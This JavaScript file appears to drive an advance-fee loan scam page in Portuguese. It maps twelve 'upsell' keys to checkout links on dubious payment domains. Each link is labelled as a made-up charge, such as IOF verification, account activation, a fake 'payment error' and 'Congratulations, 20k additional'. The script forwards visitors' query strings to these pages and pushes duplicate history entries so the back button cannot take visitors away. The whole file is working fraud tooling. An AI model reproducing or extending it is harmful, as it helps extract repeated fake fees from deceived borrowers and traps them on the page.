const baseLinks = {
    up1: "https://www.pagamentos-seguro.link/checkout/cda3b34d-9862-48ea-9e9b-0e5eef9ffef8", // IOF
    up2: "https://www.pagamentos-seguro.link/checkout/a1f06c66-fb22-47ed-9e4b-603f04444d37", // Taxa de verificação de IOF
    up3: "https://www.pagamentos-seguro.link/checkout/8715e295-b95c-46fb-af36-531ccb08efb5", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://www.pagamentos-seguro.link/checkout/0402fd3d-1989-498a-83ac-68c8f5dc767b", // NFe
    up5: "https://www.pagamentos-seguro.link/checkout/cdb0036d-32a9-49ce-8dc7-13fb0f230f17", // Ativar conta
    up6: "https://www.pagamentos-seguro.link/checkout/9981abc2-0e82-4aeb-aa0a-7d720a808289", // Taxa de registro do contrato
    up7: "https://www.pagamentos-seguro.link/checkout/b94998ab-2ad0-47dc-b70c-b4a6bbcdee61", // Parabéns, 20k adicional
    up8: "https://www.pagamentos-seguro.link/checkout/6ef7f47a-7cc1-46d9-a017-44f39a8e76b3", // Erro no pagamento - 14,06
    up9: "https://www.pagamentos-seguro.link/checkout/94e05411-2639-4cdf-ada2-503f0c69e882", // APP - 11,99
    up10:"https://www.pagamentos-seguro.link/checkout/e513d622-340b-481b-9a66-c281f7fbe3df", // Taxa de Abertura TAC - 16,92
    up11:"https://www.pagamentos-seguro.link/checkout/e572370f-a9da-4b80-8dd2-42486f9c7be3", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.paguefinal.space/c/b0169469-cebc-43af-8ef4-076055e8b716" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

